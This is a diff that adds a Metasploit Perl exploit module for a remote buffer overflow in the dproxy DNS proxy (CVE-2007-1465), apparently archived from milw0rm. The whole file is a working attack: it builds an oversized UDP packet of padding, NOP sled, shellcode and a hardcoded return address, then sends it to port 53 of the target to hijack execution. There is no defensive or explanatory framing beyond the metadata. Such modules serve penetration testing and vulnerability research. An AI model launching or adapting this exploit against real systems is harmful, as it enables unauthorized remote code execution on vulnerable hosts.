@@ -1,0 +1,95 @@
+# MetaSploit exploit for remote buffer overflow issue in dproxy
+# Written in 2007 by Alexander Klink
+# (c) 2007 Cynops GmbH
+# released under the same license as MSF (Artistic, GPL dual-licensed)
+# $Revision: 1.1 $
+
+package Msf::Exploit::dproxy;
+use strict;
+use base 'Msf::Exploit';
+use Msf::Socket::Udp;
+use Pex::Text;
+
+my $advanced = { };
+
+my $info = {
+    'Name'     => 'dproxy v0.1 - v0.5 buffer overflow exploit',
+    'Version'  => '$Revision: 1.1 $',
+
+    'Authors' => [ 'Alexander Klink, Cynops GmbH', ],
+    'Arch'    => [ 'x86' ],
+    'OS'      => [ 'linux'],
+    'Priv'    => 0,
+
+    'UserOpts'  => {
+        'RHOST' => [1, 'ADDR', 'The target address'],
+    },
+    'Payload' => {
+        'Space'     => 500,
+        'BadChars'  => "\x00",
+    },
+    'Description'  => Pex::Text::Freeform(qq{
+      This exploits a buffer overflow in dproxy version 0.1 to 0.5.
+    }),
+    'Refs' => [
+        [ 'CVE', '2007-1465' ],
+    ],
+
+    'DefaultTarget' => 0,
+    'Targets' => [
+        ['Linux', 0xbfffe480],
+    ],
+    'Keys' => [ 'dproxy' ],
+    'DisclosureDate' => 'Mar 20 2007',
+};
+
+sub new {
+    my $class = shift;
+    my $self = $class->SUPER::new(
+        {
+          'Info'     => $info,
+          'Advanced' => $advanced
+        }, @_
+    );
+
+    return $self;
+}
+
+sub Exploit {
+  my $self = shift;
+
+  my $targetHost     = $self->GetVar('RHOST');
+  my $targetPort     = 53;
+  my $targetIndex    = $self->GetVar('TARGET');
+  my $srcPort        = $self->GetVar('CPORT');
+  my $encodedPayload = $self->GetVar('EncodedPayload');
+  my $shellcode      = $encodedPayload->Payload;
+  my $target         = $self->Targets->[$targetIndex];
+
+  if (! $self->InitNops(512)) {
+      $self->PrintLine("Could not initialize the nop module");
+      return;
+  }
+  my $sock = Msf::Socket::Udp->new(
+    'PeerAddr'  => $targetHost,
+    'PeerPort'  => $targetPort,
+    'LocalPort' => $srcPort,
+  );
+  if($sock->IsError) {
+    $self->PrintLine('Error creating socket: ' . $sock->GetError);
+    return;
+  }
+
+  $self->PrintLine('Trying ' . $target->[0] . ' (' . $targetHost . ')');
+
+  my $evil = 'A' x 1000 . $self->MakeNops(500) . $shellcode
+      . 'A' x (2073 - 1500 - length($shellcode)) . pack('V', $target->[1]);
+
+  $sock->Send($evil);
+
+  return;
+}
+
+1;
+
+# milw0rm.com [2007-03-23]
